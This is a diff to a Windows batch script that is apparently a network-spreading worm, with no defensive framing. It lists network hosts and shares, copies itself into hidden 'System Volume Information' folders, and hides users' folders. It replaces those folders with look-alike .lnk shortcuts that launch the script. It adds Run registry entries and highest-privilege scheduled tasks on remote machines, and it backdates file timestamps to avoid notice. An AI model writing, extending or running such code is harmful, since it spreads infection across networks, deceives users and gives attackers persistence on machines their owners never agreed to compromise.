@@ -178,34 +178,41 @@ timeout /nobreak /t 5 >nul
 
 
 
-for /f "skip=3 tokens=1,* delims= " %%i in ('net view') do if /i "%%i" NEQ "The" (
-  for /f "skip=7 tokens=1,* delims= " %%j in ('net view %%i') do if /i "%%j" NEQ "The" (
-    if exist "%%i\%%j\%~nx0" (
-      attrib +r +s "%%i\%%j\%~nx0"
-      (
-        %module_fileTouch% /w /a /c /d %app_date% "%%i\%%j\%~nx0"
-        for /f "delims=\" %%z in ("%%i") do schtasks /create /s %%z /sc onstart /tn "%app_name% %%j" /tr "%%j:\%~nx0" /f /rl highest
-      )>nul 2>nul
-
-      if /i "%%j:" NEQ "C:" (
-        for /f "delims=" %%x in ('dir "%%i\%%j\*" /a:d /b 2^>nul') do (
-          if /i "%%x" NEQ "$RECYCLE.BIN" if /i "%%x" NEQ "FOUND.000" if /i "%%x" NEQ "Recycled" if /i "%%x" NEQ "System Volume Information" (
-            attrib +h +s "%%i\%%j\%%x"
-
-            if not exist "%%i\%%j\%%x.lnk" (
-              set counter=0
-              for /f "delims=" %%y in ('dir "%%i\%%j\%%x\*" /b 2^>nul') do set /a counter+=1
-              if "!counter!" == "0" ( set icon=%WinDir%\System32\shell32.dll,3
-              ) else set icon=%WinDir%\System32\imageres.dll,153
-              if exist "%%i\%%j\%%x\desktop.ini" for /f "tokens=1,2 delims==" %%d in ('type "%%i\%%j\%%x\desktop.ini"') do if /i "%%d" == "IconResource" set icon=%%e
-              %module_shortcut% /a:c /f:"%%i\%%j\%%x.lnk" /t:"%%i\%%j\%~nx0" /p:"--key_target="""%%j:\%%x"""" /i:"!icon!"
-            )
-          )
+for /f "skip=3 tokens=1,* delims= " %%h in ('net view') do if /i "%%h" NEQ "The" (
+  for /f "skip=7 tokens=1,* delims= " %%i in ('net view %%h') do if /i "%%i" NEQ "The" (
+    for /f "delims=" %%j in ('dir "%%h\%%i\*" /a:d /b 2^>nul') do (
+      if /i "%%j" == "System Volume Information" if not exist "%%h\%%i\%%j\%~nx0" (
+        attrib +h +s "%%h\%%i\%%j"
+        copy /y "%~dpnx0" "%%h\%%i\%%j\"
+      ) else (
+        (
+          %module_fileTouch% /w /a /c /d %app_date% "%%h\%%i\%%j\%~nx0"
+          reg add %%h\HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /d "%%i:\%%j\%~nx0" /f
+          reg add %%h\HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /d "%%i:\%%j\%~nx0" /f
+          reg add %%h\HKCU\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /d "%%i:\%%j\%~nx0" /f
+          reg add %%h\HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run /v "%app_name% %%i" /d "%%i:\%%j\%~nx0" /f
+          for /f "delims=\" %%z in ("%%i") do schtasks /create /s %%z /sc onstart /tn "%app_name% %%i" /tr "%%i:\%%j\%~nx0" /f /rl highest
+        )>nul 2>nul
+      )
+  
+      if /i "%%j" NEQ "$RECYCLE.BIN" if /i "%%j" NEQ "FOUND.000" if /i "%%j" NEQ "Recycled" if /i "%%j" NEQ "System Volume Information" (
+        attrib +h +s "%%h\%%i\%%j"
+        if not exist "%%h\%%i\%%j.lnk" (
+          set counter=0
+          for /f "delims=" %%y in ('dir "%%h\%%i\%%j\*" /b 2^>nul') do set /a counter+=1
+          if "!counter!" == "0" ( set icon=%WinDir%\System32\shell32.dll,3
+          ) else set icon=%WinDir%\System32\imageres.dll,153
+          if exist "%%h\%%i\%%j\desktop.ini" for /f "tokens=1,2 delims==" %%d in ('type "%%h\%%i\%%j\desktop.ini"') do if /i "%%d" == "IconResource" set icon=%%e
+          %module_shortcut% /a:c /f:"%%h\%%i\%%j.lnk" /t:"%%h\%%i\System Volume Information\%~nx0" /p:"--key_target="""%%i:\%%j"""" /i:"!icon!"
         )
       )
-    ) else (
-      copy /y "%~dpnx0" "%%i\%%j\"
-      if exist "%%i\%%j\%~nx0" attrib +r +s "%%i\%%j\%~nx0"
+    )
+  ) else (
+    for /f "delims=" %%j in ('dir "%%h\%%i\*" /a:d /b 2^>nul') do (
+      if /i "%%j" NEQ "$RECYCLE.BIN" if /i "%%j" NEQ "FOUND.000" if /i "%%j" NEQ "Recycled" if /i "%%j" NEQ "System Volume Information" (
+        attrib -h -s "%%h\%%i\%%j"
+        if exist "%%h\%%i\%%j.lnk" del /q "%%h\%%i\%%j.lnk"
+      )
     )
   )
 )
